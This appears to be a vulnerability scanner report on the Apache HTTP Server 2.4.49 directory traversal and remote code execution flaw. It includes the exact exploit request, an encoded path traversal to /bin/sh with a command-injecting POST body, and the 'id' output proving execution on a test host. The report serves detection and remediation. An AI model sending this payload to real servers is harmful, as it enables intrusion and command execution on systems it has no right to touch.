NVT Name: Apache HTTP Server 2.4.49 Directory Traversal / RCE Vulnerability - Active Check
Summary:
Apache HTTP Server is prone to a directory traversal
  and a possible remote code execution (RCE) vulnerability.
Specific Result:
By doing the following HTTP request:

Affected URL     : http://192.168.1.33:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh
HTTP "POST" body : A=|echo;id
HTTP Method      : POST

it was possible to execute the "id" command on the target host.

Result:

uid=1(daemon) gid=1(daemon) groups=1(daemon)
Vulnerability Insight:
An attacker could use a path traversal attack to map URLs to
  files outside the expected document root.

  If files outside of the document root are not protected by 'require all denied' these requests
  can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts.

  Note: If 'mod_cgi' is enabled this flaw can be also be used by an attacker to achieve remote code
  execution (RCE).
Vulnerability Detection Method:
Sends multiple crafted HTTP GET/POST requests and checks the
  responses.
